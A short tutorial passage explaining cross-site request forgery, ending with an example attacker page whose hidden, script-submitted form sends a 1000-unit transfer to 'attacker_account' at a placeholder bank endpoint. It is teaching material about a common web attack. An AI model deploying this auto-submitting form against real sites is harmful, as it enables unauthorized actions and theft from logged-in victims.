
## What is CSRF?
CSRF is an attack that tricks a victim into submitting a malicious request to a web application they are currently logged into. It exploits the web application's trust in the user's browser.

## How an Attacker Executes a CSRF Attack
For a CSRF attack to work, the victim must have an active session (be logged in). The attacker typically lures the victim to a malicious website that contains a hidden form, which automatically submits a request (like a money transfer) to the target application.

### Example Payload (Hidden Form):
```html
<!-- Attacker's Malicious Website -->
<h1>Click here for a surprise!</h1>
<form action="https://yourbank.com/transfer" method="POST" id="csrfForm" style="display:none;">
  <input type="hidden" name="account" value="attacker_account" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>
  document.getElementById('csrfForm').submit();
</script>
